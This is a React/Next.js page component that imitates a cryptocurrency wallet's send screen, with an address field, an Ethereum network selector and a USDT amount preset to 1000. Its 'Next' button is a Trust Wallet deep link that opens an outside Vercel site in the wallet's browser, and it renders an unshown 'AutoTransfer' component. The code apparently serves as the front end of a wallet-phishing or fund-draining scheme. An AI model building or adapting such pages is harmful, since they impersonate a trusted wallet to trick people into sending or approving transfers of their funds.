"use client";

import { useState } from "react";
import AutoTransfer from "./components/AutoTransfer";

const NEXT_LINK = "https://link.trustwallet.com/open_url?url=https://newethtest.vercel.app/";

export default function Home() {
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("1000");

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch {
      console.log("Paste failed");
    }
  };

  const parsedAmount = parseFloat(amount) || 0;

  return (
    <main
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        padding: "2rem 1rem",
        fontFamily: "'Inter', 'Segoe UI', sans-serif",
      }}
    >
      {/* ===== Transfer Form ===== */}
      <div style={formContainerStyle}>
        {/* --- Address or Domain Name --- */}
        <label style={labelStyle}>Address or Domain Name</label>
        <div style={inputRowStyle}>
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            style={textInputStyle}
          />
          <div style={inputActionsStyle}>
            <button onClick={handlePaste} style={pasteButtonStyle}>
              Paste
            </button>
            {/* Clipboard icon */}
            <button style={iconButtonStyle} title="Copy">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
              </svg>
            </button>
            {/* QR scan icon */}
            <button style={iconButtonStyle} title="Scan QR">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 3H5a2 2 0 00-2 2v2" />
                <path d="M17 3h2a2 2 0 012 2v2" />
                <path d="M21 17v2a2 2 0 01-2 2h-2" />
                <path d="M7 21H5a2 2 0 01-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        {/* --- Destination network --- */}
        <label style={{ ...labelStyle, marginTop: "1.5rem" }}>
          Destination network
        </label>
        <div style={networkSelectorStyle}>
          {/* Ethereum diamond icon */}
          <div style={ethIconContainerStyle}>
            <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#828384" />
              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#bcc0c4" />
              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#828384" />
              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#bcc0c4" />
              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#2f3030" />
              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#828384" />
            </svg>
          </div>
          <span style={{ color: "#e5e7eb", fontSize: "0.95rem" }}>
            Ethereum
          </span>
          <svg
            width="12"
            height="12"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#9ca3af"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            style={{ marginLeft: "6px" }}
          >
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </div>

        {/* --- Amount --- */}
        <label style={{ ...labelStyle, marginTop: "1.5rem" }}>Amount</label>
        <div style={amountRowStyle}>
          <input
            type="text"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            style={amountInputStyle}
          />
          <div style={amountActionsStyle}>
            {/* Up/down arrows */}
            <div style={stepperStyle}>
              <button
                style={stepBtnStyle}
                onClick={() =>
                  setAmount(String(parsedAmount + 1))
                }
              >
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="18 15 12 9 6 15" />
                </svg>
              </button>
              <button
                style={stepBtnStyle}
                onClick={() =>
                  setAmount(String(Math.max(0, parsedAmount - 1)))
                }
              >
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
            </div>
            <span style={{ color: "#9ca3af", fontSize: "0.9rem", marginLeft: "8px" }}>
              USDT
            </span>
            <button style={maxButtonStyle}>Max</button>
          </div>
        </div>

        <p style={approxStyle}>≈ ${parsedAmount.toFixed(2)}</p>
      </div>

      {/* ===== Next Button ===== */}
      <div style={{ marginTop: "2rem", marginBottom: "2rem" }}>
        <a
          href={NEXT_LINK}
          rel="noopener noreferrer"
          style={nextButtonStyle}
        >
          Next
        </a>
      </div>

      <AutoTransfer />
    </main>
  );
}

/* ============================================================
   Inline styles – dark crypto‑wallet aesthetic
   ============================================================ */

const formContainerStyle: React.CSSProperties = {
  width: "100%",
  maxWidth: "480px",
  padding: "1.75rem",
  borderRadius: "1rem",
  background: "#1a1a1a",
  border: "1px solid #2a2a2a",
};

const labelStyle: React.CSSProperties = {
  display: "block",
  color: "#4ade80",
  fontSize: "0.85rem",
  fontWeight: 500,
  marginBottom: "0.5rem",
};

/* --- Address row --- */
const inputRowStyle: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  background: "#111111",
  border: "1px solid #333",
  borderRadius: "0.75rem",
  padding: "0.65rem 0.75rem",
  gap: "0.5rem",
};

const textInputStyle: React.CSSProperties = {
  flex: 1,
  background: "transparent",
  border: "none",
  outline: "none",
  color: "#e5e7eb",
  fontSize: "0.95rem",
};

const inputActionsStyle: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  gap: "0.6rem",
  flexShrink: 0,
};

const pasteButtonStyle: React.CSSProperties = {
  background: "transparent",
  border: "none",
  color: "#4ade80",
  fontWeight: 600,
  fontSize: "0.85rem",
  cursor: "pointer",
};

const iconButtonStyle: React.CSSProperties = {
  background: "transparent",
  border: "none",
  cursor: "pointer",
  display: "flex",
  alignItems: "center",
  padding: 0,
};

/* --- Network selector --- */
const networkSelectorStyle: React.CSSProperties = {
  display: "inline-flex",
  alignItems: "center",
  gap: "0.5rem",
  background: "#111111",
  border: "1px solid #333",
  borderRadius: "2rem",
  padding: "0.5rem 1rem",
  cursor: "pointer",
};

const ethIconContainerStyle: React.CSSProperties = {
  width: "32px",
  height: "32px",
  borderRadius: "50%",
  background: "#232323",
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  flexShrink: 0,
};

/* --- Amount row --- */
const amountRowStyle: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  background: "#111111",
  border: "1px solid #333",
  borderRadius: "0.75rem",
  padding: "0.65rem 0.75rem",
  gap: "0.5rem",
};

const amountInputStyle: React.CSSProperties = {
  flex: 1,
  background: "transparent",
  border: "none",
  outline: "none",
  color: "#e5e7eb",
  fontSize: "1.1rem",
  fontWeight: 600,
};

const amountActionsStyle: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  flexShrink: 0,
};

const stepperStyle: React.CSSProperties = {
  display: "flex",
  flexDirection: "column",
  gap: "2px",
};

const stepBtnStyle: React.CSSProperties = {
  background: "transparent",
  border: "none",
  cursor: "pointer",
  padding: "0 2px",
  display: "flex",
  alignItems: "center",
};

const maxButtonStyle: React.CSSProperties = {
  background: "transparent",
  border: "none",
  color: "#4ade80",
  fontWeight: 700,
  fontSize: "0.85rem",
  cursor: "pointer",
  marginLeft: "8px",
};

const approxStyle: React.CSSProperties = {
  color: "#9ca3af",
  fontSize: "0.85rem",
  marginTop: "0.75rem",
};

const nextButtonStyle: React.CSSProperties = {
  display: "inline-block",
  padding: "0.85rem 3rem",
  backgroundColor: "#4ade80",
  color: "#000000",
  fontWeight: 700,
  fontSize: "1rem",
  borderRadius: "0.75rem",
  textDecoration: "none",
  cursor: "pointer",
  transition: "background-color 0.2s ease",
};